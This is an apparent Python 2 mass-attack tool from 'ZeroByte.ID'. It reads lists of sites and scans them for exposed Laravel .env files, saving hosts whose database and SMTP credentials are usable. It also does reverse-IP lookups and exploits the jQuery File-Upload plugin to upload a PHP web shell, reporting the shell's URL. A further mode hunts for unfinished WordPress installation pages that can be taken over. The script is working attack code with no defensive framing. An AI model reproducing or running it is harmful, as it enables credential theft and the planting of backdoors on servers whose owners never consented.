#!/usr/bin/python
#
# Author : Suhada \\ https://github.com/suhada99 //
# Home Page : https:///zerobyte.id
#

import requests
import os
headers = {
  "User-Agent": "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36",
}
files = {
    	"files": ("zb-uploader.php", open("./shell/zb-uploader.php", "rb")),
}
class bcolors:
    HIJAU="\033[0;32m"
    MERAH="\033[01;31m"
    NORMAL="\033[0m"
    CYAN="\033[0;36m"
    BIRU="\033[0;34m"
    PUTIH="\033[1;37m"

print bcolors.MERAH
print "  ___  _           _   _   _                _          _    _       "
print " / _ \| |__  _   _| |_| |_| |_    __      _| |__   ___| | _| | ___  "
print "| | | | '_ \| | | | __| __| __|___\ \ /\ / / '_ \ / _ \ |/ / |/ _ \ "
print "| |_| | |_) | |_| | |_| |_| ||_____\ V  V /| | | |  __/   <| | (_) |"
print " \___/|_.__/ \__, |\__|\__|\__|     \_/\_/ |_| |_|\___|_|\_\_|\___/ "
print "             |___/                                                  "
print "                                              |--------------------|"
print "                                              | sUHada@zerobyte.id |"
print "                                              |--------------------|"

print bcolors.PUTIH
def LeNv():
	print bcolors.PUTIH
	print "    __                                __ "
	print "   / /   ____ __________ __   _____  / / "
	print "  / /   / __ `/ ___/ __ `/ | / / _ \/ /  "
	print " / /___/ /_/ / /  / /_/ /| |/ /  __/ /___"
	print "/_____/\__,_/_/   \__,_/ |___/\___/_____/"
	print "                              Environment"
	print "            -- ZeroByte.ID --            "
	print bcolors.NORMAL
	li = raw_input("Input your file list : ")
	fs = open(li, "r").read().split()
	fs.sort()
	for site in fs:
		print bcolors.NORMAL
		eNv = "{}/.env".format(site)
		r = requests.get(eNv, timeout=5)
		rel = r.text
		print "Try it => {}".format(site)
		if "APP_ENV" in rel:
			print(bcolors.HIJAU + " [OK] Laravel")
			if "malitrap.io" in rel:
				print "  DATABASE [OK]"
				print "  SMTPS [BAD]"
			else:
				print "  DATABASE [OK]"
				print "  SMTPS [OK]"
				lw.write(r.url + "\n")
		else:
			print(bcolors.MERAH + " [BAD] Laravel")

	print bcolors.NORMAL
	lw.close()

def rIp():
	print "    ____                                ________ "
	print "   / __ \___ _   _____  _____________  /  _/ __ \\"
	print "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \ / // /_/ /"
	print " / _, _/  __/ |/ /  __/ /  (__  )  __// // ____/ "
	print "/_/ |_|\___/|___/\___/_/  /____/\___/___/_/      "
	print "                                API Hacker Target"
	print bcolors.NORMAL
	rd = raw_input("Input your domain : ")
	r = requests.get("https://api.hackertarget.com/reverseiplookup/?q={}".format(rd), timeout=5)
	rrs = r.text
	if "error check" in rrs:
		print(bcolors.MERAH + " [BAD] {}".format(rd))
		print "Please check your domains"
	else:
		print(bcolors.HIJAU + " [OK] {}".format(rd))
		print(r.text)
		rw.write(r.text)
		print bcolors.NORMAL
		print "Your result reverse IP in file result/result-reverse.txt"
		
def jQu():
	print "       _ ____                        ______  __    "
	print "      (_) __ \__  _____  _______  __/ __/ / / /___ "
	print "     / / / / / / / / _ \/ ___/ / / / /_/ / / / __ \\"
	print "    / / /_/ / /_/ /  __/ /  / /_/ / __/ /_/ / /_/ /"
	print " __/ /\___\_\__,_/\___/_/   \__, /_/  \____/ .___/ "
	print "/___/                      /____/         /_/      "
	print "                         Plugins Jquery File Upload"
	print bcolors.NORMAL
	jd = raw_input("Input your domain full path: ")
	r = requests.post("{}/index.php".format(jd), files=files)
	rc = requests.get("{}/files/zb-uploader.php".format(jd))
	rjq = rc.text
	if "ZeroByte.ID" in rjq:
		print(bcolors.HIJAU + " [OK] Upload Done")
		print " Your access shell : {}/files/zb-uploader.php".format(jd)
	else:
		print(bcolors.MERAH + " [BAD] Upload Failed")


def jQuL():
	print "       _ ____                        ______  __    "
	print "      (_) __ \__  _____  _______  __/ __/ / / /___ "
	print "     / / / / / / / / _ \/ ___/ / / / /_/ / / / __ \\"
	print "    / / /_/ / /_/ /  __/ /  / /_/ / __/ /_/ / /_/ /"
	print " __/ /\___\_\__,_/\___/_/   \__, /_/  \____/ .___/ "
	print "/___/                      /____/         /_/      "
	print "                         Plugins Jquery File Upload"
	print bcolors.NORMAL
	jl = raw_input("Input your file list : ")
	js = open(jl, "r").read().split()
	js.sort()
	for site in js:
		print bcolors.NORMAL
		print "Try it => {}".format(site)
		r = requests.post("{}/assets/plugins/jquery-file-upload/server/php/index.php".format(site), files=files)
		rc = requests.get("{}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site))
		rjq = rc.text
		if "ZeroByte.ID" in rjq:
			print(bcolors.HIJAU + " [OK] Upload Done")
			print " Your access shell : {}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site)
			jw.write(site + "/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php\n")
		else:
			print(bcolors.MERAH + " [BAD] Upload Failed")
def wPI():
	print "           ____  ____           __        ____"
	print " _      __/ __ \/  _/___  _____/ /_____ _/ / /"
	print "| | /| / / /_/ // // __ \/ ___/ __/ __ `/ / / "
	print "| |/ |/ / ____// // / / (__  ) /_/ /_/ / / /  "
	print "|__/|__/_/   /___/_/ /_/____/\__/\__,_/_/_/   "
	print "                    Checking Page Installasion"
	print bcolors.NORMAL
	wl = raw_input(" Input your file list : ")
	ws = open(wl, "r").read().split()
	ws.sort()
	patchw = ["/wordpress/", "/wp/", "/test/", "/wptest/", "/new/", "/"]
	for site in ws:
		print bcolors.NORMAL
		print "Try it => {}".format(site)
		i = 0
		while i < len(patchw):
			r = requests.get("{}{}/wp-admin/setup-config.php?step=0".format(site, patchw[i]), timeout=5)
			rwp = r.text
			if "setup-config.php?step=1" in rwp:
				print(bcolors.HIJAU + " [OK] {}{}".format(site, patchw[i]))
				ww.write("{}{}".format(site, patchw[i]) + "\n")
			else:
				print(bcolors.MERAH + " [BAD] {}{}".format(site, patchw[i]))
			i += 1
	print bcolors.NORMAL

print " 1. LaraveL Environmet List [DB & SMTP]"
print " 2. Reverse IP [API Hacker Target]"
print " 3. jQuery File-Upload"
print " 4. wP-insTall Check Page Installation"
p = raw_input("Choose? ")

if (p == "1"):
	lw = open("./result/result-laravel.txt","w")
	os.system("cls" if os.name == "nt" else "clear")
	LeNv()
elif (p == "2"):
	rw = open("./result/result-reverse.txt","w")
	os.system("cls" if os.name == "nt" else "clear")
	rIp()
elif(p ==  "3"):
	jw = open("./result/result-jquery.txt","w")
	print "  1. jQuery File-Upload just one domain"
	print "  2. jQuery File-Upload with domain list"
	ps = raw_input("Choose? ")
	os.system("cls" if os.name == "nt" else "clear")
	if (ps == "1"):
		os.system("cls" if os.name == "nt" else "clear")
		jQu()
	elif (ps == "2"):
		os.system("cls" if os.name == "nt" else "clear")
		jQuL()
elif(p == "4"):
	ww = open("./result/result-wpinstall.txt","w")
	os.system("cls" if os.name == "nt" else "clear")
	wPI()
else:
	print " Please choose number"
